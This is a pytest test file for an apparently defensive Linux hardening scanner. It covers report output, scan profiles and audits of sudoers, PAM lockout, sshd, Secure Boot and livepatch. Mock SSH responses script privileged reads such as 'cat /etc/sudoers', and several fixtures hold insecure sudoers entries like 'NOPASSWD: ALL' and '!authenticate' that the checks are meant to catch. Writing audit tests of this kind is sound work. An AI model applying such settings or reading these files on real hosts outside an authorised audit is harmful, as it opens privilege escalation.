        assert report["checks"][0]["test_id"] == "STOR-6310"
        assert report["checks"][0]["category"] == "Storage"

    def test_json_output_ports_section(self):
        """Test ports section structure"""
        system = self._base_system()
        ports = [
            PortStatus(port=22, open=True, reason="ssh"),
            PortStatus(port=80, open=True, reason="http"),
            PortStatus(port=443, open=False, reason="filtered"),
        ]
        json_output = render_report_json(system, [], ports, None)
        report = json.loads(json_output)

        assert report["ports"]["scanned"] == 3
        assert report["ports"]["open"] == 2
        assert len(report["ports"]["open_ports"]) == 2
        assert report["ports"]["open_ports"][0]["port"] == 22

    def test_json_output_valid_json(self):
        """Test that output is valid JSON"""
        system = self._base_system()
        json_output = render_report_json(system, [], [], None)

        # Should not raise exception
        report = json.loads(json_output)
        assert isinstance(report, dict)


class TestConfigurationSystem:
    """Tests for profile/configuration system"""

    def test_config_import_available(self):
        """Test that config module is importable"""
        try:
            from linux_health import config

            assert hasattr(config, "ScanProfile")
            assert hasattr(config, "load_profile")
            assert hasattr(config, "should_skip_test")
        except ImportError:
            pytest.skip("PyYAML not installed, config system unavailable")

    def test_scan_profile_creation(self):
        """Test creating ScanProfile"""
        try:
            from linux_health.config import ScanProfile

            profile = ScanProfile(
                name="test",
                skip_tests={"TEST-1", "TEST-2"},
                skip_categories={"Storage"},
            )

            assert profile.name == "test"
            assert "TEST-1" in profile.skip_tests
            assert "Storage" in profile.skip_categories
        except ImportError:
            pytest.skip("PyYAML not installed")

    def test_should_skip_test_by_id(self):
        """Test skipping by test ID"""
        try:
            from linux_health.config import ScanProfile, should_skip_test

            profile = ScanProfile(skip_tests={"STOR-6310"})

            assert should_skip_test("STOR-6310", "Storage", profile) is True
            assert should_skip_test("MEM-2914", "Memory", profile) is False
        except ImportError:
            pytest.skip("PyYAML not installed")

    def test_should_skip_test_by_category(self):
        """Test skipping by category"""
        try:
            from linux_health.config import ScanProfile, should_skip_test

            profile = ScanProfile(skip_categories={"Storage", "Memory"})

            assert should_skip_test("STOR-6310", "Storage", profile) is True
            assert should_skip_test("MEM-2914", "Memory", profile) is True
            assert should_skip_test("CPU-1620", "CPU/Load", profile) is False
        except ImportError:
            pytest.skip("PyYAML not installed")

    def test_should_skip_test_only_mode(self):
        """Test only_tests exclusive mode"""
        try:
            from linux_health.config import ScanProfile, should_skip_test

            profile = ScanProfile(only_tests={"STOR-6310", "MEM-2914"})

            assert should_skip_test("STOR-6310", "Storage", profile) is False
            assert should_skip_test("MEM-2914", "Memory", profile) is False
            assert should_skip_test("CPU-1620", "CPU/Load", profile) is True
        except ImportError:
            pytest.skip("PyYAML not installed")

    def test_load_profile_from_yaml(self):
        """Test loading profile from YAML file"""
        try:
            from linux_health.config import load_profile

            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".yaml", delete=False
            ) as f:
                f.write("""
name: "test-profile"
description: "Test profile"
skip_tests:
  - STOR-6310
  - MEM-2914
skip_categories:
  - "Malware Detection"
timeout: 15
verbose: true
""")
                profile_path = f.name

            try:
                profile = load_profile(profile_path)

                assert profile.name == "test-profile"
                assert "STOR-6310" in profile.skip_tests
                assert "Malware Detection" in profile.skip_categories
                assert profile.timeout == 15
                assert profile.verbose is True
            finally:
                Path(profile_path).unlink(missing_ok=True)
        except ImportError:
            pytest.skip("PyYAML not installed")


class TestCLIEnhancements:
    """Tests for enhanced CLI features"""

    def test_parser_has_format_option(self):
        """Test that --format option exists"""
        parser = build_parser()
        args = parser.parse_args(["host", "user", "pass", "--format", "json"])

        assert args.format == "json"

    def test_parser_format_choices(self):
        """Test format argument accepts valid choices"""
        parser = build_parser()

        args_text = parser.parse_args(["host", "user", "pass", "--format", "text"])
        assert args_text.format == "text"

        args_md = parser.parse_args(["host", "user", "pass", "--format", "md"])
        assert args_md.format == "md"

        args_json = parser.parse_args(["host", "user", "pass", "--format", "json"])
        assert args_json.format == "json"

    def test_parser_has_profile_option(self):
        """Test that --profile option exists"""
        parser = build_parser()
        args = parser.parse_args(["host", "user", "pass", "--profile", "test.yaml"])

        assert args.profile == "test.yaml"

    def test_parser_profile_optional(self):
        """Test that profile is optional"""
        parser = build_parser()
        args = parser.parse_args(["host", "user", "pass"])

        assert args.profile is None


class TestCheckResultWithTestID:
    """Tests for CheckResult with test_id field"""

    def test_check_result_has_test_id_field(self):
        """Test that CheckResult includes test_id"""
        result = CheckResult(
            category="Test",
            item="Test Item",
            status="pass",
            details="Details",
            recommendation="Recommendation",
            test_id="TEST-1234",
        )

        assert result.test_id == "TEST-1234"

    def test_check_result_test_id_defaults_to_empty(self):
        """Test that test_id defaults to empty string"""
        result = CheckResult(
            category="Test",
            item="Test Item",
            status="pass",
            details="Details",
            recommendation="Recommendation",
        )

        assert result.test_id == ""


class TestHardeningIndex:
    """Tests for hardening index calculation"""

    def test_calculate_hardening_index_all_pass(self):
        """Test hardening index when all checks pass"""
        checks = [
            CheckResult(
                category="Security",
                item="Check 1",
                status="pass",
                details="Details",
                recommendation="Recommendation",
            ),
            CheckResult(
                category="Security",
                item="Check 2",
                status="pass",
                details="Details",
                recommendation="Recommendation",
            ),
        ]
        from linux_health.report import calculate_hardening_index

        index = calculate_hardening_index(checks)
        assert index["overall_index"] == 100

    def test_calculate_hardening_index_with_warnings(self):
        """Test hardening index with warnings"""
        checks = [
            CheckResult(
                category="Security",
                item="Check 1",
                status="pass",
                details="Details",
                recommendation="Recommendation",
            ),
            CheckResult(
                category="Security",
                item="Check 2",
                status="warn",
                details="Details",
                recommendation="Recommendation",
            ),
        ]
        from linux_health.report import calculate_hardening_index

        index = calculate_hardening_index(checks)
        # 1 pass (100%) + 1 warn (50%) = 75%
        assert index["overall_index"] == 75

    def test_calculate_hardening_index_with_failures(self):
        """Test hardening index with failures"""
        checks = [
            CheckResult(
                category="Security",
                item="Check 1",
                status="pass",
                details="Details",
                recommendation="Recommendation",
            ),
            CheckResult(
                category="Security",
                item="Check 2",
                status="fail",
                details="Details",
                recommendation="Recommendation",
            ),
        ]
        from linux_health.report import calculate_hardening_index

        index = calculate_hardening_index(checks)
        # 1 pass (100%) + 1 fail (0%) = 50%
        assert index["overall_index"] == 50

    def test_calculate_hardening_index_excludes_unknown(self):
        """Unknown results count separately and never move the index."""
        checks = [
            CheckResult(
                category="Security",
                item="Check 1",
                status="pass",
                details="Details",
                recommendation="Recommendation",
            ),
            CheckResult(
                category="Privilege",
                item="Check 2 skipped (unprivileged)",
                status="unknown",
                details="Details",
                recommendation="Recommendation",
            ),
        ]
        from linux_health.report import calculate_hardening_index

        index = calculate_hardening_index(checks)
        assert index["unknown"] == 1
        assert index["total_checks"] == 2
        # 1 pass assessed alone = 100 (unknown excluded, not 50/66)
        assert index["overall_index"] == 100

    def test_calculate_hardening_index_all_unknown(self):
        """Nothing assessed scores 0 with everything counted unknown."""
        checks = [
            CheckResult(
                category="Scan",
                item="Check 1 timed out",
                status="unknown",
                details="Details",
                recommendation="Recommendation",
            ),
        ]
        from linux_health.report import calculate_hardening_index

        index = calculate_hardening_index(checks)
        assert index["overall_index"] == 0
        assert index["unknown"] == 1


class TestProfileLoading:
    """Tests for profile loading functionality"""

    def test_load_nonexistent_profile_raises_error(self):
        """Test that loading nonexistent profile raises error"""
        from linux_health.config import load_profile

        with pytest.raises(FileNotFoundError):
            load_profile("/nonexistent/profile.yaml")

    def test_load_profile_with_invalid_yaml_fails_gracefully(self):
        """Test that invalid YAML is handled properly"""
        from linux_health.config import load_profile

        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as f:
            f.write("invalid: [yaml content\n")
            f.flush()
            temp_path = f.name

        try:
            with pytest.raises(Exception):
                load_profile(temp_path)
        finally:
            Path(temp_path).unlink()

    def test_create_default_profile(self):
        """Test creating default profile"""
        from linux_health.config import create_default_profile

        with tempfile.TemporaryDirectory() as tmpdir:
            output_path = Path(tmpdir) / "default.yaml"
            create_default_profile(str(output_path))
            assert output_path.exists()
            content = output_path.read_text(encoding="utf-8")
            assert "skip_tests:" in content or "only_tests:" in content


class TestSystemInfoGathering:
    """Tests for system information gathering"""

    def test_system_info_structure(self):
        """Test that SystemInfo has required fields"""
        system_info = SystemInfo(
            hostname="test-host",
            os="Linux",
            kernel="5.10.0",
            uptime="10 days",
            users="2 users",
        )
        assert system_info.hostname == "test-host"
        assert system_info.os == "Linux"
        assert system_info.kernel == "5.10.0"
        assert system_info.uptime == "10 days"
        assert system_info.users == "2 users"


class TestJSONReportValidation:
    """Tests for JSON report structure and validation"""

    def test_json_report_structure(self):
        """Test that JSON report has required structure"""
        system_info = SystemInfo(
            hostname="test-host",
            os="Linux",
            kernel="5.10.0",
            uptime="10 days",
            users="2 users",
        )
        checks = [
            CheckResult(
                category="Security",
                item="Test Check",
                status="pass",
                details="Details",
                recommendation="Recommendation",
                test_id="TEST-001",
            ),
        ]

        report = render_report_json(
            system_info,
            checks,
            [],
        )

        data = json.loads(report)
        assert "scan_info" in data
        assert "system" in data
        assert "summary" in data
        assert "checks" in data

    def test_json_report_checks_contain_test_ids(self):
        """Test that checks in JSON report include test IDs"""
        system_info = SystemInfo(
            hostname="test-host",
            os="Linux",
            kernel="5.10.0",
            uptime="10 days",
            users="2 users",
        )
        checks = [
            CheckResult(
                category="Security",
                item="Test Check",
                status="pass",
                details="Details",
                recommendation="Recommendation",
                test_id="AUTH-9328",
            ),
        ]

        report = render_report_json(
            system_info,
            checks,
            [],
        )

        data = json.loads(report)
        assert len(data["checks"]) > 0
        assert "test_id" in data["checks"][0]

    def test_json_report_has_hardening_summary(self):
        """Test that JSON report includes hardening summary"""
        system_info = SystemInfo(
            hostname="test-host",
            os="Linux",
            kernel="5.10.0",
            uptime="10 days",
            users="2 users",
        )
        checks = [
            CheckResult(
                category="Security",
                item="Test Check",
                status="pass",
                details="Details",
                recommendation="Recommendation",
            ),
        ]

        report = render_report_json(
            system_info,
            checks,
            [],
        )

        data = json.loads(report)
        assert "summary" in data
        assert "total_checks" in data["summary"]
        assert "passed" in data["summary"]


class TestErrorHandling:
    """Tests for error handling in critical functions"""

    def test_check_result_creation_with_defaults(self):
        """Test creating CheckResult with default values"""
        result = CheckResult(
            category="Security",
            item="Test Check",
            status="pass",
            details="Details",
            recommendation="Recommendation",
        )
        assert result.status == "pass"
        assert result.test_id == ""

    def test_text_report_rendering(self):
        """Test basic text report rendering"""
        system_info = SystemInfo(
            hostname="test-host",
            os="Linux",
            kernel="5.10.0",
            uptime="10 days",
            users="2 users",
        )
        checks = [
            CheckResult(
                category="Security",
                item="Test Check",
                status="pass",
                details="All good",
                recommendation="Keep monitoring",
            ),
        ]

        # render_report returns a single string
        text_output = render_report(system_info, checks, [])
        assert isinstance(text_output, str)
        assert len(text_output) > 0
        assert "test-host" in text_output or "Security" in text_output


class TestPerformanceOptimizations:
    """Tests for performance features like command caching."""

    def test_command_cache_stores_results(self):
        """Test that command cache stores and retrieves results."""
        from linux_health.checks import enable_command_cache

        enable_command_cache()
        reset_command_cache()

        # Create a mock SSH session
        mock_ssh = MagicMock()
        mock_ssh._client = MagicMock()
        mock_ssh._client.exec_command.return_value = (
            MagicMock(write=MagicMock(), flush=MagicMock(), close=MagicMock()),
            MagicMock(
                read=MagicMock(return_value=b"test output"),
                channel=MagicMock(
                    exit_status_ready=MagicMock(return_value=True),
                    recv_exit_status=MagicMock(return_value=0),
                ),
            ),
            MagicMock(read=MagicMock(return_value=b"")),
        )

        # Simulate running a command through _run
        from linux_health.checks import _run

        cmd = "test command"
        result = _run(mock_ssh, cmd, use_cache=True)

        # Verify result structure
        assert isinstance(result, tuple)
        assert len(result) == 3  # (exit_code, stdout, stderr)

    def test_cache_cleared_between_sessions(self):
        """Test that cache can be cleared for new sessions."""
        from linux_health.checks import _COMMAND_CACHE

        reset_command_cache()
        assert len(_COMMAND_CACHE) == 0

        reset_command_cache()
        assert len(_COMMAND_CACHE) == 0


class TestEdgeCases:
    """Tests for edge cases and boundary conditions."""

    def test_empty_check_results_render(self):
        """Test rendering with empty check results."""
        system_info = SystemInfo(
            hostname="test-host",
            os="Ubuntu 22.04",
            kernel="5.15.0",
            uptime="1 day",
            users="1",
        )

        # Empty checks list
        output = render_report(system_info, [], [])
        assert isinstance(output, str)
        assert len(output) > 0

    def test_check_result_with_empty_details(self):
        """Test CheckResult with empty details field."""
        check = CheckResult(
            category="Test",
            item="Empty Details Check",
            status="pass",
            details="",
            recommendation="None",
        )

        assert check.details == ""
        assert check.status == "pass"

    def test_check_result_with_special_characters(self):
        """Test CheckResult handles special characters in details."""
        special_chars = "!@#$%^&*()_+-=[]{}|;:',.<>?/`~"
        check = CheckResult(
            category="Special",
            item="Unicode Test: 你好 мир",
            status="pass",
            details=f"Details with special chars: {special_chars}",
            recommendation="Keep safe",
        )

        assert special_chars in check.details
        assert "你好" in check.item
        assert "мир" in check.item

    def test_system_info_with_special_values(self):
        """Test SystemInfo with unusual but valid values."""
        system = SystemInfo(
            hostname="server-with-many-dots.example.com.local",
            os="Custom-Linux-Distro-v1.2.3",
            kernel="6.0.0-rc1+",
            uptime="365 days, 23 hours",
            users="0",  # No logged in users
        )

        assert len(system.hostname) > 20
        assert "Custom" in system.os
        assert system.users == "0"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])


def test_main_only_tests_filters_to_subset(monkeypatch, tmp_path):
    """--only-tests keeps matching IDs and drops everything else."""
    import json

    from linux_health import cli

    TestMainScanOrchestration()._patch_all(monkeypatch)
    out = tmp_path / "r.json"
    argv = ["h", "u", "pw", "--format", "json", "--output", str(out)]
    assert cli.main(argv + ["--only-tests", "T-1"]) == 0
    report = json.loads(out.read_text(encoding="utf-8"))
    assert report["summary"]["total_checks"] == 1
    out2 = tmp_path / "r2.json"
    argv2 = ["h", "u", "pw", "--format", "json", "--output", str(out2)]
    assert cli.main(argv2 + ["--only-tests", "NOPE-0"]) == 0
    assert json.loads(out2.read_text(encoding="utf-8"))["summary"]["total_checks"] == 0


def test_main_skip_tests_drops_match(monkeypatch, tmp_path):
    """--skip-tests removes matching IDs and keeps the rest."""
    import json

    from linux_health import cli

    TestMainScanOrchestration()._patch_all(monkeypatch)
    out = tmp_path / "r.json"
    argv = ["h", "u", "pw", "--format", "json", "--output", str(out)]
    assert cli.main(argv + ["--skip-tests", "T-1"]) == 0
    report = json.loads(out.read_text(encoding="utf-8"))
    assert report["summary"]["total_checks"] == 0
    out2 = tmp_path / "r2.json"
    argv2 = ["h", "u", "pw", "--format", "json", "--output", str(out2)]
    assert cli.main(argv2 + ["--skip-tests", "OTHER-9"]) == 0
    assert json.loads(out2.read_text(encoding="utf-8"))["summary"]["total_checks"] == 1


class TestCheckSudoersDAuditing:
    """Tests for sudoers drop-in auditing (AUTH-9341)."""

    _host_seq = 0

    def _session(self, routes):
        TestCheckSudoersDAuditing._host_seq += 1
        hostname = f"sudoers-test-{TestCheckSudoersDAuditing._host_seq}"
        from unittest.mock import Mock

        def fake_run(command, timeout=10.0):
            for key, response in routes:
                if key in command:
                    return response
            return 1, "", ""

        ssh = Mock()
        ssh._client = None
        ssh.hostname = hostname
        ssh.run = fake_run
        return ssh

    def test_no_sudo_passes(self):
        """Hosts without sudo are clean by definition."""
        from linux_health.checks import check_sudoers_d_auditing

        ssh = self._session([("command -v sudo", (1, "", ""))])
        result = check_sudoers_d_auditing(ssh, "")
        assert result.status == "pass"
        assert "not installed" in result.details.lower()

    def test_clean_sudoers_passes(self):
        """Scoped config without NOPASSWD passes."""
        from linux_health.checks import check_sudoers_d_auditing

        ssh = self._session(
            [
                ("command -v sudo", (0, "/usr/bin/sudo", "")),
                ("cat /etc/sudoers", (0, "root ALL=(ALL:ALL) ALL\n", "")),
                ("stat -c", (0, "440 0 /etc/sudoers\n", "")),
            ]
        )
        result = check_sudoers_d_auditing(ssh, "pw")
        assert result.status == "pass"

    def test_unrestricted_nopasswd_fails(self):
        """NOPASSWD: ALL is an auth bypass (fail)."""
        from linux_health.checks import check_sudoers_d_auditing

        ssh = self._session(
            [
                ("command -v sudo", (0, "/usr/bin/sudo", "")),
                (
                    "cat /etc/sudoers",
                    (0, "deploy ALL=(ALL) NOPASSWD: ALL\n", ""),
                ),
                ("stat -c", (0, "440 0 /etc/sudoers\n", "")),
            ]
        )
        result = check_sudoers_d_auditing(ssh, "pw")
        assert result.status == "fail"
        assert "nopasswd" in result.details.lower()

    def test_scoped_nopasswd_warns(self):
        """Command-scoped NOPASSWD is a review item, not a failure."""
        from linux_health.checks import check_sudoers_d_auditing

        ssh = self._session(
            [
                ("command -v sudo", (0, "/usr/bin/sudo", "")),
                (
                    "cat /etc/sudoers",
                    (0, "backup ALL=(ALL) NOPASSWD: /usr/bin/rsync\n", ""),
                ),
                ("stat -c", (0, "440 0 /etc/sudoers\n", "")),
            ]
        )
        result = check_sudoers_d_auditing(ssh, "pw")
        assert result.status == "warn"

    def test_authenticate_disabled_fails(self):
        """!authenticate anywhere fails closed."""
        from linux_health.checks import check_sudoers_d_auditing

        ssh = self._session(
            [
                ("command -v sudo", (0, "/usr/bin/sudo", "")),
                ("cat /etc/sudoers", (0, "Defaults !authenticate\n", "")),
                ("stat -c", (0, "440 0 /etc/sudoers\n", "")),
            ]
        )
        result = check_sudoers_d_auditing(ssh, "pw")
        assert result.status == "fail"
        assert "!authenticate" in result.details

    def test_world_writable_sudoers_fails(self):
        """Group/world-writable sudoers files are a privesc vector."""
        from linux_health.checks import check_sudoers_d_auditing

        ssh = self._session(
            [
                ("command -v sudo", (0, "/usr/bin/sudo", "")),
                ("cat /etc/sudoers", (0, "root ALL=(ALL:ALL) ALL\n", "")),
                ("stat -c", (0, "440 0 /etc/sudoers\n666 0 /etc/sudoers.d/x\n", "")),
            ]
        )
        result = check_sudoers_d_auditing(ssh, "pw")
        assert result.status == "fail"
        assert "writable" in result.details.lower()

    def test_commented_nopasswd_ignored(self):
        """Commented-out entries must not trip the check."""
        from linux_health.checks import check_sudoers_d_auditing

        ssh = self._session(
            [
                ("command -v sudo", (0, "/usr/bin/sudo", "")),
                ("cat /etc/sudoers", (0, "# deploy ALL=(ALL) NOPASSWD: ALL\n", "")),
                ("stat -c", (0, "440 0 /etc/sudoers\n", "")),
            ]
        )
        result = check_sudoers_d_auditing(ssh, "pw")
        assert result.status == "pass"


class TestCheckPamFaillock:
    """Tests for PAM faillock / pwquality completeness (AUTH-9350)."""

    _host_seq = 0

    def _session(self, routes):
        from unittest.mock import Mock

        TestCheckPamFaillock._host_seq += 1
        hostname = f"pam-test-{TestCheckPamFaillock._host_seq}"

        def fake_run(command, timeout=10.0):
            for key, response in routes:
                if key in command:
                    return response
            return 1, "", ""

        ssh = Mock()
        ssh._client = None
        ssh.hostname = hostname
        ssh.run = fake_run
        return ssh

    def test_faillock_absent_warns(self):
        """No pam_faillock in stacks means no throttling (warn)."""
        from linux_health.checks import check_pam_faillock

        ssh = self._session([("pam_faillock.so", (0, "", ""))])
        result = check_pam_faillock(ssh, "")
        assert result.status == "warn"
        assert "not enabled" in result.details.lower()

    def test_complete_config_passes(self):
        """Explicit deny/unlock_time/retry is clean."""
        from linux_health.checks import check_pam_faillock

        ssh = self._session(
            [
                ("pam_faillock.so", (0, "auth required pam_faillock.so preauth", "")),
                (
                    "faillock.conf",
                    (0, "deny = 3\nunlock_time = 600\n", ""),
                ),
                ("pwquality", (0, "retry = 2\nminlen = 14\n", "")),
            ]
        )
        result = check_pam_faillock(ssh, "")
        assert result.status == "pass"

    def test_generous_deny_warns(self):
        """deny above 5 is called out."""
        from linux_health.checks import check_pam_faillock

        ssh = self._session(
            [
                ("pam_faillock.so", (0, "auth required pam_faillock.so preauth", "")),
                (
                    "faillock.conf",
                    (0, "deny = 10\nunlock_time = 600\n", ""),
                ),
                ("pwquality", (0, "retry = 2\n", "")),
            ]
        )
        result = check_pam_faillock(ssh, "")
        assert result.status == "warn"
        assert "deny=10" in result.details

    def test_missing_values_warn(self):
        """Implicit defaults are flagged for explicitness."""
        from linux_health.checks import check_pam_faillock

        ssh = self._session(
            [
                ("pam_faillock.so", (0, "auth required pam_faillock.so preauth", "")),
                ("faillock.conf", (0, "even_deny_root\n", "")),
                ("pwquality", (0, "minlen = 14\n", "")),
            ]
        )
        result = check_pam_faillock(ssh, "")
        assert result.status == "warn"
        assert "deny" in result.details.lower()
        assert "unlock_time" in result.details.lower()
        assert "retry" in result.details.lower()

    def test_excessive_retry_warns(self):
        """retry above 3 aids guessing."""
        from linux_health.checks import check_pam_faillock

        ssh = self._session(
            [
                ("pam_faillock.so", (0, "auth required pam_faillock.so preauth", "")),
                (
                    "faillock.conf",
                    (0, "deny = 3\nunlock_time = 600\n", ""),
                ),
                ("pwquality", (0, "retry = 9\n", "")),
            ]
        )
        result = check_pam_faillock(ssh, "")
        assert result.status == "warn"
        assert "retry=9" in result.details


class TestCheckSSHConfigDirectives:
    """Tests for extended sshd hardening directives (SSH-7408 family)."""

    _host_seq = 0

    def _session(self, routes):
        from unittest.mock import Mock

        TestCheckSSHConfigDirectives._host_seq += 1
        hostname = f"sshd-test-{TestCheckSSHConfigDirectives._host_seq}"

        def fake_run(command, timeout=10.0):
            for key, response in routes:
                if key in command:
                    return response
            return 1, "", ""

        ssh = Mock()
        ssh._client = None
        ssh.hostname = hostname
        ssh.run = fake_run
        return ssh

    HARDENED_T = (
        "passwordauthentication no\npermitrootlogin no\nport 2222\n"
        "maxauthtries 4\nlogingracetime 60\nclientaliveinterval 300\n"
        "clientalivecountmax 3\nallowusers deploy\n"
    )
    DEFAULT_T = (
        "passwordauthentication yes\npermitrootlogin yes\nport 22\n"
        "maxauthtries 6\nlogingracetime 120\nclientaliveinterval 0\n"
        "clientalivecountmax 3\n"
    )

    def _by_item(self, results):
        return {r.item: r for r in results}

    def test_hardened_sshd_all_pass(self):
        """Fully hardened sshd -T passes every directive incl. rating."""
        from linux_health.checks import check_ssh_config

        ssh = self._session([("sshd -T", (0, self.HARDENED_T, ""))])
        found = self._by_item(check_ssh_config(ssh, ""))
        for item in (
            "SSH access allow-list",
            "SSH MaxAuthTries",
            "SSH LoginGraceTime",
            "SSH ClientAlive",
        ):
            assert found[item].status == "pass", item
        assert found["SSH Security Rating"].status == "pass"
        assert "(9/9)" in found["SSH Security Rating"].details

    def test_default_sshd_warns_new_directives(self):
        """Stock defaults warn on all four new directives (Poor rating)."""
        from linux_health.checks import check_ssh_config

        ssh = self._session([("sshd -T", (0, self.DEFAULT_T, ""))])
        found = self._by_item(check_ssh_config(ssh, ""))
        for item in (
            "SSH access allow-list",
            "SSH MaxAuthTries",
            "SSH LoginGraceTime",
            "SSH ClientAlive",
        ):
            assert found[item].status == "warn", item
        rating = found["SSH Security Rating"]
        assert rating.status == "warn"
        assert "Poor" in rating.details

    def test_grep_fallback_with_directives(self):
        """Config-grep path honors set directives and skips comments."""
        from linux_health.checks import check_ssh_config

        ssh = self._session(
            [
                ("sshd -T", (1, "", "no sshd")),
                (
                    "grep -E",
                    (
                        0,
                        "#AllowUsers commented\nAllowUsers deploy\nMaxAuthTries 3\n",
                        "",
                    ),
                ),
            ]
        )
        found = self._by_item(check_ssh_config(ssh, ""))
        assert found["SSH access allow-list"].status == "pass"
        assert found["SSH MaxAuthTries"].status == "pass"

    def test_time_parser_units(self):
        """sshd time values parse across bare/s/m/h forms."""
        from linux_health.checks import _parse_sshd_time

        assert _parse_sshd_time("60") == 60
        assert _parse_sshd_time("60s") == 60
        assert _parse_sshd_time("2m") == 120
        assert _parse_sshd_time("1h") == 3600
        assert _parse_sshd_time(None) is None
        assert _parse_sshd_time("bogus") is None


class TestCheckSecureBoot:
    """Tests for Secure Boot + module signature enforcement (BOOT-5124)."""

    _host_seq = 0

    def _session(self, routes):
        from unittest.mock import Mock

        TestCheckSecureBoot._host_seq += 1
        hostname = f"secureboot-test-{TestCheckSecureBoot._host_seq}"

        def fake_run(command, timeout=10.0):
            for key, response in routes:
                if key in command:
                    return response
            return 1, "", ""

        ssh = Mock()
        ssh._client = None
        ssh.hostname = hostname
        ssh.run = fake_run
        return ssh

    def test_no_efi_passes_not_applicable(self):
        """VMs/containers without EFI firmware pass (not applicable)."""
        from linux_health.checks import check_secure_boot

        ssh = self._session([("[ -d /sys/firmware/efi ]", (0, "NOEFI", ""))])
        result = check_secure_boot(ssh, "")
        assert result.status == "pass"
        assert "not applicable" in result.details.lower()

    def test_enabled_and_enforced_passes(self):
        """Secure Boot on with enforced module signatures is clean."""
        from linux_health.checks import check_secure_boot

        ssh = self._session(
            [
                ("[ -d /sys/firmware/efi ]", (0, "EFI", "")),
                (
                    "mokutil --sb-state",
                    (0, "SecureBoot enabled\n", ""),
                ),
                (
                    'grep -o "module',
                    (0, "BOOT_IMAGE=/vmlinuz module.sig_enforce=1 quiet\n", ""),
                ),
            ]
        )
        result = check_secure_boot(ssh, "")
        assert result.status == "pass"

    def test_disabled_warns(self):
        """Disabled Secure Boot is a hardening gap."""
        from linux_health.checks import check_secure_boot

        ssh = self._session(
            [
                ("[ -d /sys/firmware/efi ]", (0, "EFI", "")),
                ("mokutil --sb-state", (0, "SecureBoot disabled\n", "")),
                ('grep -o "module', (0, "BOOT_IMAGE=/vmlinuz quiet\n", "")),
            ]
        )
        result = check_secure_boot(ssh, "")
        assert result.status == "warn"
        assert "disabled" in result.details.lower()

    def test_unenforced_signatures_warns(self):
        """Secure Boot without module enforcement is inconsistent."""
        from linux_health.checks import check_secure_boot

        ssh = self._session(
            [
                ("[ -d /sys/firmware/efi ]", (0, "EFI", "")),
                ("mokutil --sb-state", (0, "SecureBoot enabled\n", "")),
                ('grep -o "module', (0, "BOOT_IMAGE=/vmlinuz quiet\n", "")),
            ]
        )
        result = check_secure_boot(ssh, "")
        assert result.status == "warn"
        assert "sig_enforce" in result.details.lower()

    def test_indeterminable_warns(self):
        """EFI present but unreadable state warns instead of passing."""
        from linux_health.checks import check_secure_boot

        ssh = self._session(
            [
                ("[ -d /sys/firmware/efi ]", (0, "EFI", "")),
                ("mokutil --sb-state", (1, "", "")),
                ('grep -o "module', (1, "", "")),
            ]
        )
        result = check_secure_boot(ssh, "")
        assert result.status == "warn"
        assert "could not determine" in result.details.lower()


class TestCheckKernelLivepatch:
    """Tests for kernel livepatch status (KRNL-5790). Report-only: never FAIL."""

    _host_seq = 0

    def _session(self, output, code=0):
        from unittest.mock import Mock

        TestCheckKernelLivepatch._host_seq += 1
        hostname = f"livepatch-test-{TestCheckKernelLivepatch._host_seq}"
        ssh = Mock()
        ssh._client = None
        ssh.hostname = hostname
        ssh.run = lambda command, timeout=10.0: (code, output, "")
        return ssh

    def test_no_tooling_is_unknown(self):
        """Absent tooling is informational unknown, excluded from scoring."""
        from linux_health.checks import check_kernel_livepatch

        ssh = self._session("", code=1)
        result = check_kernel_livepatch(ssh, "")
        assert result.status == "unknown"
        assert result.test_id == "KRNL-5790"

    def test_canonical_active_passes(self):
        """Enabled Canonical Livepatch with applied patches is clean."""
        from linux_health.checks import check_kernel_livepatch

        ssh = self._session(
            "/usr/bin/canonical-livepatch\n"
            "status: enabled\n"
            "patch state: applied\n"
        )
        result = check_kernel_livepatch(ssh, "")
        assert result.status == "pass"

    def test_canonical_disabled_warns(self):
        """Installed but not enabled warns (never fails)."""
        from linux_health.checks import check_kernel_livepatch

        ssh = self._session(
            "/usr/bin/canonical-livepatch\n"
            "Machine is not enabled. Please run `pro enable`.\n"
        )
        result = check_kernel_livepatch(ssh, "")
        assert result.status == "warn"

    def test_kpatch_loaded_passes(self):
        """Loaded kpatch modules pass."""
        from linux_health.checks import check_kernel_livepatch

        ssh = self._session(
            "/usr/bin/kpatch\nLoaded patch modules:\nkpatch_5_15_0_91\n"
        )
        result = check_kernel_livepatch(ssh, "")
        assert result.status == "pass"

    def test_kpatch_idle_warns(self):
        """kpatch present with no loaded patches warns."""
        from linux_health.checks import check_kernel_livepatch

        ssh = self._session("/usr/bin/kpatch\nLoaded patch modules:\n")
        result = check_kernel_livepatch(ssh, "")
        assert result.status == "warn"

    def test_sysfs_enabled_passes(self):
        """A live /sys/kernel/livepatch enabled flag passes."""
        from linux_health.checks import check_kernel_livepatch

        ssh = self._session("/sys/kernel/livepatch/kpatch_5_15_0_91/enabled:1\n")
        result = check_kernel_livepatch(ssh, "")
        assert result.status == "pass"

    def test_never_fails(self):
        """Report-only contract: no input may produce FAIL."""
        from linux_health.checks import check_kernel_livepatch

        for output in (
            "",
            "garbage $$$ output\n",
            "/usr/bin/canonical-livepatch\nstatus: unknown-thing\n",
        ):
            ssh = self._session(output)
            assert check_kernel_livepatch(ssh, "").status != "fail"
